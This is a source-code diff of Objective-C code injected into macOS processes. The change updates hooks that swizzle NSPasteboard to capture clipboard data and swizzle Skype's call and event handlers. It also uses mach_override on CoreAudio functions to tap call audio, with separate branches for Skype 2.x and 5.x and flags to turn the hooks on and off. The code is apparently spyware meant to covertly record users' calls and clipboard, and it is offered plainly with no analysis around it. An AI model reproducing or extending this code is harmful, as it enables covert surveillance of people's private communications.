@@ -929,115 +929,160 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
           clipboardFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Hooking clipboards");
+          infoLog(@"Hooking clipboards");
 #endif
           // In order to avoid a linker error for a missing implementation
           Class className = objc_getClass("NSPasteboard");
           
-          swizzleMethod(className, @selector(setData:forType:),
-                        className, @selector(setDataHook:forType:));
+          //swizzleMethod(className, @selector(setData:forType:),
+                        //className, @selector(setDataHook:forType:));
+          swizzleByAddingIMP(className,
+              @selector(setData:forType:),
+              class_getMethodImplementation(className,
+                                @selector(setDataHook:forType:)),
+              @selector(setDataHook:forType:));
         }
       else if (clipboardFlag == 3)
         {
           clipboardFlag = 0;
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Unhooking clipboards");
+          infoLog(@"Unhooking clipboards");
 #endif
           // In order to avoid a linker error for a missing implementation
           Class className = objc_getClass("NSPasteboard");
           
-          swizzleMethod(className, @selector(setData:forType:),
-                        className, @selector(setDataHook:forType:));
+          //swizzleMethod(className, @selector(setData:forType:),
+                        //className, @selector(setDataHook:forType:));
+          swizzleByAddingIMP(className,
+              @selector(setData:forType:),
+              class_getMethodImplementation(className,
+                                @selector(setDataHook:forType:)),
+              @selector(setDataHook:forType:));
         }
       
       if (voipFlag == 1)
         {
           voipFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Hooking voip calls");
+          infoLog(@"Hooking voip calls");
 #endif
-          // In order to avoid a linker error for a missing implementation
-          //Class className = objc_getClass("MacCallX");
-          
-          //swizzleMethod(className, @selector(placeCallTo:),
-          //              className, @selector(placeCallToHook:));
-          
-          //swizzleMethod(className, @selector(answer),
-          //              className, @selector(answerHook));
-          
-          // In order to avoid a linker error for a missing implementation
+          mach_error_t mError;
+
+          //
+          // Let's check which skype we have here
+          // Looks like skype 5 doesn't implement few selectors available on
+          // 2.x branch
+          //
           Class className   = objc_getClass("MacCallX");
           Class classSource = objc_getClass("myMacCallX");
-          
-          class_addMethod(className,
-                          @selector(checkActiveMembersName),
-                          class_getMethodImplementation(classSource, @selector(checkActiveMembersName)),
-                          "v@:");
-          //swizzleMethod(className, @selector(isMessageRecentlyDisplayed:),
-          //              className, @selector(isMessageRecentlyDisplayedHook:));
-          
-          swizzleByAddingIMP (className, @selector(placeCallTo:),
-                              class_getMethodImplementation(classSource, @selector(placeCallToHook:)),
-                              @selector(placeCallToHook:));
-          swizzleByAddingIMP (className, @selector(answer),
-                              class_getMethodImplementation(classSource, @selector(answerHook)),
-                              @selector(answerHook));
-                            
-          VPSKypeStartAgent();
-          
-          mach_error_t mError;
-          
-          if ((mError = mach_override("_AudioDeviceAddIOProc", "CoreAudio",
-                                      (void *)&_hook_AudioDeviceAddIOProc,
-                                      (void **)&_real_AudioDeviceAddIOProc)))
+          Method method     = class_getInstanceMethod(className,
+                                                      @selector(placeCallTo:));
+
+          //
+          // Dunno why but checking with respondsToSelector
+          // doesn't work here... Odd
+          //
+          if (method != nil)
             {
 #ifdef DEBUG_INPUT_MANAGER
-              errorLog(@"mach_override error");//: %s (0x%x)", mach_error_string(mError), mError);
+              infoLog(@"Hooking skype 2.x");
 #endif
+              //
+              // We're dealing with skype 2.x
+              //
+              class_addMethod(className,
+                  @selector(checkActiveMembersName),
+                  class_getMethodImplementation(classSource,
+                                    @selector(checkActiveMembersName)),
+                  "v@:");
+
+              swizzleByAddingIMP(className,
+                  @selector(placeCallTo:),
+                  class_getMethodImplementation(classSource,
+                                    @selector(placeCallToHook:)),
+                  @selector(placeCallToHook:));
+              swizzleByAddingIMP(className,
+                  @selector(answer),
+                  class_getMethodImplementation(classSource,
+                                    @selector(answerHook)),
+                  @selector(answerHook));
+              swizzleByAddingIMP(className,
+                  @selector(isFinished),
+                  class_getMethodImplementation(classSource,
+                                    @selector(isFinishedHook)),
+                  @selector(isFinishedHook));
+
+              if ((mError = mach_override("_AudioDeviceAddIOProc", "CoreAudio",
+                                          (void *)&_hook_AudioDeviceAddIOProc,
+                                          (void **)&_real_AudioDeviceAddIOProc)))
+                {
+#ifdef DEBUG_INPUT_MANAGER
+                  errorLog(@"mach_override error on AudioDeviceAddIOProc");
+#endif
+                }
+              if ((mError = mach_override("_AudioDeviceRemoveIOProc", "CoreAudio",
+                                          (void *)&_hook_AudioDeviceRemoveIOProc,
+                                          (void **)&_real_AudioDeviceRemoveIOProc)))
+                {
+#ifdef DEBUG_INPUT_MANAGER
+                  errorLog(@"mach_override error on AudioDeviceRemoveIOProc");
+#endif
+                }
+              
+              //
+              // For 2.x we can start hooking here since AddIOProc deals only
+              // with input/output voice call (that is, no effects are managed
+              // by registered procs)
+              //
+              VPSkypeStartAgent();
             }
-          
-          if ((mError = mach_override("_AudioDeviceRemoveIOProc", "CoreAudio",
-                                      (void *)&_hook_AudioDeviceRemoveIOProc,
-                                      (void **)&_real_AudioDeviceRemoveIOProc)))
+          else
             {
 #ifdef DEBUG_INPUT_MANAGER
-              errorLog(@"mach_override error");//: %s (0x%x)", mach_error_string(mError), mError);
+              infoLog(@"Hooking skype 5.x");
 #endif
-            }
-          
-          if ((mError = mach_override("_AudioDeviceCreateIOProcID", "CoreAudio",
-                                      (void *)&_hook_AudioDeviceCreateIOProcID,
-                                      (void **)&_real_AudioDeviceCreateIOProcID)))
-            {
+
+              Class c1 = objc_getClass("EventController");
+              Class c2 = objc_getClass("myEventController");
+              
+              swizzleByAddingIMP(c1,
+                  @selector(handleNotification:),
+                  class_getMethodImplementation(c2,
+                                    @selector(handleNotificationHook:)),
+                  @selector(handleNotificationHook:));
+
+              //
+              // We're dealing with skype 5.x
+              //
+              if ((mError = mach_override("_AudioDeviceCreateIOProcID", "CoreAudio",
+                                          (void *)&_hook_AudioDeviceCreateIOProcID,
+                                          (void **)&_real_AudioDeviceCreateIOProcID)))
+                {
 #ifdef DEBUG_INPUT_MANAGER
-              errorLog(@"mach_override error");//: %s (0x%x)", mach_error_string(mError), mError);
+                  errorLog(@"mach_override error on AudioDeviceCreateIOProcID");
 #endif
-            }
-          
-          if ((mError = mach_override("_AudioDeviceGetProperty", "CoreAudio",
-                                      (void *)&_hook_AudioDeviceGetProperty,
-                                      (void **)&_real_AudioDeviceGetProperty)))
-            {
+                }
+
+              if ((mError = mach_override("_AudioDeviceDestroyIOProcID", "CoreAudio",
+                                          (void *)&_hook_AudioDeviceDestroyIOProcID,
+                                          (void **)&_real_AudioDeviceDestroyIOProcID)))
+                {
 #ifdef DEBUG_INPUT_MANAGER
-              errorLog(@"mach_override error");//: %s (0x%x)", mach_error_string(mError), mError);
+                  errorLog(@"mach_override error on AudioDeviceDestroyIOProcID");
 #endif
+                }
             }
-          
-          if ((mError = mach_override("_AudioDeviceSetProperty", "CoreAudio",
-                                      (void *)&_hook_AudioDeviceSetProperty,
-                                      (void **)&_real_AudioDeviceSetProperty)))
-            {
-#ifdef DEBUG_INPUT_MANAGER
-              errorLog(@"mach_override error");//: %s (0x%x)", mach_error_string(mError), mError);
-#endif
-            }
-          
+
+          //
+          // Those are shared among the different versions
+          // and need to be hooked all the times
+          //
           if ((mError = mach_override("_AudioDeviceStart", "CoreAudio",
                                       (void *)&_hook_AudioDeviceStart,
                                       (void **)&_real_AudioDeviceStart)))
             {
 #ifdef DEBUG_INPUT_MANAGER
-              errorLog(@"mach_override error");//: %s (0x%x)", mach_error_string(mError), mError);
+              errorLog(@"mach_override error on AudioDeviceStart");
 #endif
             }
           
@@ -1046,7 +1091,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                       (void **)&_real_AudioDeviceStop)))
             {
 #ifdef DEBUG_INPUT_MANAGER
-              errorLog(@"mach_override error");//: %s (0x%x)", mach_error_string(mError), mError);
+              errorLog(@"mach_override error");
 #endif
             }
         }
@@ -1054,21 +1099,45 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
           voipFlag = 0;
           
-          VPSKypeStopAgent();
+          VPSkypeStopAgent();
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Unhooking voip calls");
+          infoLog(@"Unhooking voip calls");
 #endif
           
           // In order to avoid a linker error for a missing implementation
           Class className   = objc_getClass("MacCallX");
           Class classSource = objc_getClass("myMacCallX");
           
-          swizzleByAddingIMP (className, @selector(placeCallTo:),
-                              class_getMethodImplementation(classSource, @selector(placeCallToHook:)),
-                              @selector(placeCallToHook:));
-          swizzleByAddingIMP (className, @selector(answer),
-                              class_getMethodImplementation(classSource, @selector(answerHook)),
-                              @selector(answerHook));
+          if ([className respondsToSelector: @selector(placeCallTo:)])
+            {
+              //
+              // Skype 2.x
+              //
+              swizzleByAddingIMP(className,
+                                @selector(placeCallTo:),
+                                class_getMethodImplementation(classSource,
+                                               @selector(placeCallToHook:)),
+                                @selector(placeCallToHook:));
+              swizzleByAddingIMP(className,
+                                 @selector(answer),
+                                 class_getMethodImplementation(classSource,
+                                                @selector(answerHook)),
+                                 @selector(answerHook));
+            }
+          else
+            {
+              //
+              // Skype 5.x
+              //
+              Class c1 = objc_getClass("EventController");
+              Class c2 = objc_getClass("myEventController");
+              
+              swizzleByAddingIMP(c1,
+                  @selector(handleNotification:),
+                  class_getMethodImplementation(c2,
+                                    @selector(handleNotificationHook:)),
+                  @selector(handleNotificationHook:));
+            }
         }
       
       usleep(8000);
